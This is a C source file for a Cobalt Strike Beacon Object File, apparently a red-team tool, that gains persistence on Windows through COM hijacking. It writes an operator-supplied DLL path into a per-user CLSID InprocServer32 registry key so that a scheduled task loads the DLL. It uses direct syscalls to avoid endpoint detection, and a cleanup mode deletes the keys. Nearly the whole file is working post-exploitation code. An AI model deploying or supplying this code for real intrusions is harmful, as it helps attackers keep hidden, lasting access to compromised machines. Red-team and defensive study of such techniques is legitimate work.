////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      PERSISTSCHEDULEDTASKCOMHIJACK BOF                                                                             //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o PersistScheduledTaskCOMHijack.o -c PersistScheduledTaskCOMHijack.c -masm=intel           //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include "beacon.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT size_t MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT wchar_t* MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT NTSYSAPI NTSTATUS NTAPI NTDLL$RtlOpenCurrentUser(ACCESS_MASK, PHANDLE);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen) {

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* buff1 = BeaconDataExtract(&parser, NULL);
    char* buff2 = BeaconDataExtract(&parser, NULL);

    //TODO: change memory allocation
    wchar_t name[200] = L"Software\\Classes\\CLSID\\";
    wchar_t classid[300];
    wchar_t dllpath[300];

    toWideChar(buff1, classid, 300);
    toWideChar(buff2, dllpath, 300);
    int cleanup = BeaconDataInt(&parser);

    /*==================================*/
    /*          SETTING UP KEYS         */
    /*==================================*/

    NTSTATUS status;
    HANDLE key, root;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING keyName;

    if(!cleanup){
        MSVCRT$wcscat(name, classid);
        MSVCRT$wcscat(name, L"\\InprocServer32");

        keyName.Buffer = name;
        keyName.Length = MSVCRT$wcslen(name) * 2;
        keyName.MaximumLength = 0;
        InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
        NTDLL$RtlOpenCurrentUser(KEY_READ, &root);
        oa.RootDirectory = root;

        status = NtOpenKeyEx(&key, KEY_WRITE, &oa, 0);
        if (status != STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Could not open key: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }

        UNICODE_STRING valueName;
        valueName.Buffer = 0;
        valueName.Length = 0;
        valueName.MaximumLength = 0;

        status = NtSetValueKey(key, &valueName, 0, REG_SZ, (PVOID)dllpath, MSVCRT$wcslen(dllpath) * 2);
        if(status != STATUS_SUCCESS){
            BeaconPrintf(CALLBACK_ERROR, "Could not set key value: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }
    }
    else {
        MSVCRT$wcscat(name, classid);
        MSVCRT$wcscat(name, L"\\InprocServer32");

        keyName.Buffer = name;
        keyName.Length = MSVCRT$wcslen(name) * 2;
        keyName.MaximumLength = 0;
        InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
        NTDLL$RtlOpenCurrentUser(KEY_READ, &root);
        oa.RootDirectory = root;

        status = NtOpenKeyEx(&key, DELETE, &oa, 0);
        if (status != STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Could not open key: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }

        status = NtDeleteKey(key);
        if(status != STATUS_SUCCESS){
            BeaconPrintf(CALLBACK_ERROR, "Could not delete key: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }

        NtClose(key);

        //TODO: better implementation
        wchar_t name2[200] = L"Software\\Classes\\CLSID\\";
        MSVCRT$wcscat(name2, classid);

        keyName.Buffer = name2;
        keyName.Length = MSVCRT$wcslen(name2) * 2;
        InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL, NULL);
        oa.RootDirectory = root;

        status = NtOpenKeyEx(&key, DELETE, &oa, 0);
        if (status != STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_ERROR, "Could not open key: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }

        status = NtDeleteKey(key);
        if(status != STATUS_SUCCESS){
            BeaconPrintf(CALLBACK_ERROR, "Could not delete key: %x", status);
            NtClose(key);
            NtClose(root);
            return;
        }
    }

    NtClose(key);
    NtClose(root);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
}